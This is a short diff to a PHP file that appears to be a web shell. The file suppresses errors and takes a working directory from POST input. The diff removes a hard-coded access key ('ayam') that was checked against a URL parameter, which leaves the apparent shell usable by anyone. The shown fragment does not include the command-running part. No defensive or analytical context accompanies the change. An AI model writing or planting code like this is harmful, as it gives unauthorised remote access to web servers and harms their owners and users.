@@ -1,9 +1,5 @@
 <?php
 @error_reporting(0);
-$key = 'ayam';
-$gk = isset($_GET['k']) ? $_GET['k'] : (isset($_GET['key']) ? $_GET['key'] : '');
-if ($gk !== $key) { http_response_code(403); exit; }
-
 $cwd = (isset($_POST['cwd']) && is_dir($_POST['cwd'])) ? $_POST['cwd'] : getcwd();
 $out = '';
 $mode = '';
